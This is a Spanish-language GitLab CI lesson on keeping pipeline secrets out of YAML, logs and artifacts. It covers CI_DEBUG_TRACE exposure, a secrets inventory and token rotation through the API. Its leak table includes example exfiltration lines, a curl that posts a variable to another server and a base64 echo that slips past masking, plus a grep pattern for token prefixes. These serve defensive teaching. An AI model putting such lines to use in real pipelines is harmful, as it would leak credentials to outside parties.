# Secretos fuera del YAML y del log

> Un secreto bien guardado en una variable protegida todavía puede acabar en un commit, en un log o en un artefacto. Esta teoría recorre por dónde se escapan, qué hace `CI_DEBUG_TRACE` con tus variables, cómo se lleva la cuenta de los secretos que tienes y cómo se cambia uno sin que su valor pase por tus manos.

---

## 🎯 Objetivos

- Reconocer las cinco formas habituales de filtrar un secreto desde un pipeline
- Saber qué escribe `CI_DEBUG_TRACE` en el log y quién puede activarlo
- Escribir un inventario de secretos que sirva para algo
- Rotar un token de proyecto y actualizar su variable en un solo paso
- Situar `id_tokens` y `secrets:` en el mapa: qué es Free y qué no

---

## 1. Qué problema resuelve

Las teorías 04 a 06 deciden qué job recibe cada secreto. Pero una vez dentro, el job puede sacarlo por descuido. Y fuera del pipeline, un secreto que nadie sabe que existe no se rota nunca: caduca un viernes por la tarde o sigue vivo años después de que se fuera quien lo creó.

---

## 2. Cómo funciona

### 2.1 Por dónde se escapa un secreto

| Vía | Ejemplo | Lo para |
|---|---|---|
| El YAML | `DEPLOY_TOKEN: "<TOKEN>"` en `variables:` | Variables de proyecto. `checks.json` busca formas de token en el YAML de `main` |
| El log | `echo $DEPLOY_TOKEN`, `env`, `set -x` | `masked`, y no imprimir nunca el valor: `${#VAR}` |
| El log, transformado | `echo $DEPLOY_TOKEN \| base64` | Nada: el enmascarado solo reconoce el valor exacto |
| Un artefacto o la caché | Un `.env` generado dentro del directorio del repositorio | Variables de tipo archivo, que viven fuera; `artifacts:paths` explícito |
| Otro servidor | `curl https://otro-sitio --data "$X"` desde una merge request | `protected`: que no llegue |

`masked` cubre una fila y media. Las demás dependen de lo que no llega al job y de la revisión.

La detección de secretos en cada push (*secret push protection*) es **Ultimate**. En CE, la Semana 19 añade Gitleaks al pipeline; hasta entonces, la revisión de la merge request y la comprobación del YAML.

### 2.2 `CI_DEBUG_TRACE`

Con `CI_DEBUG_TRACE: "true"`, el runner ejecuta el job con trazas de shell y **escribe en el log todas las variables del job**. En el laboratorio:

```
export CI_JOB_TOKEN=[MASKED]
export GOB=[MASKED]
export X=desde-proyecto
printf '%s' contenido-del-archivo > "/builds/root/app.tmp/FILEVAR"
```

Las enmascaradas salen como `[MASKED]`. Las que no lo están, en claro, **incluido el contenido de las variables de tipo archivo**. Una clave SSH en una variable de archivo protegida sale entera en el log de un job de `main` con la traza activada.

Quién puede activarla:

| Vía | Quién en `app` |
|---|---|
| En el YAML de un job | Cualquiera que abra una merge request. Pero su pipeline no recibe las variables protegidas |
| Como variable al lanzar un pipeline de `main` | Solo quien puede fusionar en `main` (Semana 07), y además solo Maintainer desde la práctica 02 (`ci_pipeline_variables_minimum_override_role`) |
| Como variable de proyecto | Maintainer |

Úsala solo en una rama, sin secretos de por medio, y nunca la dejes en el YAML.

### 2.3 El inventario

Un secreto del que no hay registro no se rota. `docs/secretos.md` en `app` tiene una fila por secreto:

| Columna | Por qué |
|---|---|
| Nombre y tipo | `DEPLOY_TOKEN`, texto; `DEPLOY_SSH_KEY`, archivo |
| Ámbito y protección | Qué jobs lo reciben |
| Quién puede leerlo | No "nadie": el job, y quien pueda cambiar el YAML de una ref protegida |
| De dónde sale | Qué sistema lo emite y quién puede revocarlo allí |
| Caducidad o rotación | Una fecha, no "cuando haga falta" |
| Qué pasa si se filtra | Qué hace quien lo tenga, y el primer paso para cortarlo |

El valor **no** va nunca en el inventario. Va su existencia.

### 2.4 Rotar sin ver

Rotar un token de proyecto crea uno nuevo con los mismos permisos y revoca el anterior en la misma operación:

```bash
TID=$(curl -s -H "$H" "$API/projects/$P/access_tokens" \
  | jq -r '.[] | select(.name == "gobernanza-ci" and .active) | .id')
[[ "$TID" =~ ^[0-9]+$ ]] || { echo "No hay un único gobernanza-ci activo: NO sigas"; return 1 2>/dev/null || exit 1; }
curl -s --request POST "$API/projects/$P/access_tokens/$TID/rotate" -H "$H" \
  --data "expires_at=$(date -d '+180 days' +%F)" \
  | jq -j '.token // empty' \
  | curl -s --request PUT "$API/projects/$P/variables/GOBERNANZA_TOKEN" -H "$H" \
      --data-urlencode "value@-" \
  | jq '{key, masked, hidden, value}'
```

El token nuevo pasa de una respuesta a la otra por una tubería, como en la Semana 09. La variable sigue oculta y enmascarada (`value: null`). Si el `PUT` falla después de rotar, el job `gobernanza` falla hasta que lo repitas: el token viejo ya no vale. La lista de tokens conserva el revocado, con `revoked: true`.

### 2.5 Fuera de GitLab: `id_tokens` y `secrets:`

| Pieza | Qué hace | Tier |
|---|---|:--:|
| `id_tokens:` | El job recibe un JWT firmado por GitLab que dice quién es: proyecto, ref, si es protegida. Un servicio externo (Vault, OpenBao, una nube) lo verifica y entrega un secreto de vida corta | **Free** |
| `secrets:` | GitLab pide el secreto a Vault, Azure Key Vault o GCP Secret Manager y lo entrega al job | **Premium**. En 19.2.4 CE, el lint responde `config contains unknown keys: secrets` |

Con `id_tokens` el secreto no vive en GitLab: el job lo pide con su identidad y caduca en minutos. En CE es el camino, con un paso más en el script. `app` no lo necesita todavía: no hay gestor de secretos en el laboratorio, y montarlo es otro bootcamp.

---

## 3. Cómo se configura

Buscar formas de token en el YAML de `main`, como hace `checks.json`:

```bash
curl -s -H "$H" "$API/projects/$P/ci/lint?ref=main&include_merged_yaml=true" \
  | jq -r .merged_yaml | grep -cE 'glpat-|glptt-|glrt-|gldt-|PRIVATE KEY'      # 0
```

Los tokens de proyecto y cuándo caducan:

```bash
curl -s -H "$H" "$API/projects/$P/access_tokens" \
  | jq -r '.[] | "\(.name) active=\(.active) revoked=\(.revoked) \(.expires_at)"'
```

---

## 4. Antipatrones

| Antipatrón | Por qué duele | Qué hacer en su lugar |
|---|---|---|
| `env` o `printenv` para depurar | Vuelca todo lo no enmascarado | `env \| cut -d= -f1`: solo los nombres |
| `CI_DEBUG_TRACE` en el YAML de `main` | Cada job de `main` escribe sus variables de archivo en el log | Solo en una rama, y quitarla antes de fusionar |
| Copiar el token nuevo de la respuesta y pegarlo en la interfaz | Pasa por el portapapeles y la pantalla | La tubería de 2.4 |
| Un inventario con los valores | Es un secreto más, sin protección | Solo nombre, origen, ámbito y fecha |
| "Ya lo rotaremos cuando caduque" | Caduca sin aviso y el pipeline falla | La fecha en el inventario; el aviso en la Semana 11 |

---

## 5. Trucos

- **Qué variables recibe un job, sin valores**: `env | cut -d= -f1 | sort` en una rama.
- **Cuándo caduca el token de `gobernanza`**: `GET .../access_tokens | jq -r '.[] | select(.active) | "\(.name) \(.expires_at)"'`.
- **Un secreto sospechoso de filtrado**: primero rotarlo, después investigar. El orden importa.

---

## 📚 Recursos Adicionales

- [Pipeline security](https://docs.gitlab.com/ci/pipeline_security/) — secretos, variables y `CI_DEBUG_TRACE`
- [Enable debug logging](https://docs.gitlab.com/ci/variables/variables_troubleshooting/#enable-debug-logging) — qué expone y quién lo ve
- [Rotate a project access token](https://docs.gitlab.com/api/project_access_tokens/#rotate-a-project-access-token) — la API
- [OpenID Connect (OIDC) authentication using ID tokens](https://docs.gitlab.com/ci/secrets/id_token_authentication/) — `id_tokens`, Free
- [Using external secrets in CI](https://docs.gitlab.com/ci/secrets/) — `secrets:`, Premium

---

## ✅ Checklist de Verificación

- [ ] Sabes por qué vías se escapa un secreto y cuáles cubre `masked`
- [ ] Sabes qué escribe `CI_DEBUG_TRACE` en el log y quién puede activarlo en `main`
- [ ] Sabes qué columnas tiene un inventario útil y qué no va nunca en él
- [ ] Sabes rotar `GOBERNANZA_TOKEN` sin ver el token nuevo

---

[← Anterior: Variables de archivo y *secure files*](06-variables-de-archivo-y-secure-files.md) · [Volver a la Semana 10](../README.md)
